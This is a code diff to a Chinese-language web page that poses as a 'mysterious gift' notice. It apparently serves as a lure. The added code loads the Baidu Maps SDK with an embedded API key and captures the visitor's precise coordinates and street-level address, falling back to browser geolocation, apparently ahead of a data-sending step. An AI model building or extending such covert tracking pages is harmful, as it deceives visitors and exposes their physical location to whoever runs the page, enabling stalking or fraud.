@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🎁 恭喜！您获得了一份神秘礼物</title>
     <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
+    <!-- 百度地图定位 SDK -->
+    <script type="text/javascript" src="https://api.map.baidu.com/api?v=3.0&ak=qowtuFN97ps5CJRYgrBBzMiq3cXkfy9L"></script>
     <style>
         * {
             margin: 0;
@@ -429,37 +431,72 @@
             return match ? match[1] : 'Unknown';
         }
 
-        // 获取位置信息
+        // 获取位置信息 - 使用百度地图定位（更精确）
         function getLocation() {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({});
-                    return;
-                }
-
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            altitude: position.coords.altitude,
-                            altitudeAccuracy: position.coords.altitudeAccuracy,
-                            heading: position.coords.heading,
-                            speed: position.coords.speed
-                        });
-                    },
-                    (error) => {
-                        console.log('Location error:', error.message);
-                        resolve({});
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
+                // 检查百度地图是否加载
+                if (typeof BMap !== 'undefined') {
+                    try {
+                        const geolocation = new BMap.Geolocation();
+                        geolocation.getCurrentPosition(function(result) {
+                            if (this.getStatus() === BMAP_STATUS_SUCCESS) {
+                                // 百度地图定位成功，返回详细地址
+                                resolve({
+                                    latitude: result.latitude,
+                                    longitude: result.longitude,
+                                    accuracy: result.accuracy,
+                                    // 百度地图返回的地址信息
+                                    baiduAddress: result.address ? result.address.province + result.address.city + result.address.district + result.address.street : '',
+                                    baiduProvince: result.address ? result.address.province : '',
+                                    baiduCity: result.address ? result.address.city : '',
+                                    baiduDistrict: result.address ? result.address.district : '',
+                                    baiduStreet: result.address ? result.address.street : ''
+                                });
+                            } else {
+                                console.log('百度定位失败，尝试浏览器定位');
+                                fallbackToNavigator(resolve);
+                            }
+                        }, {enableHighAccuracy: true});
+                    } catch (e) {
+                        console.log('百度地图错误:', e);
+                        fallbackToNavigator(resolve);
                     }
-                );
+                } else {
+                    // 百度地图未加载，使用浏览器定位
+                    fallbackToNavigator(resolve);
+                }
             });
+        }
+
+        // 备用浏览器定位
+        function fallbackToNavigator(resolve) {
+            if (!navigator.geolocation) {
+                resolve({});
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    resolve({
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed
+                    });
+                },
+                (error) => {
+                    console.log('Location error:', error.message);
+                    resolve({});
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
         }
 
         // 发送数据
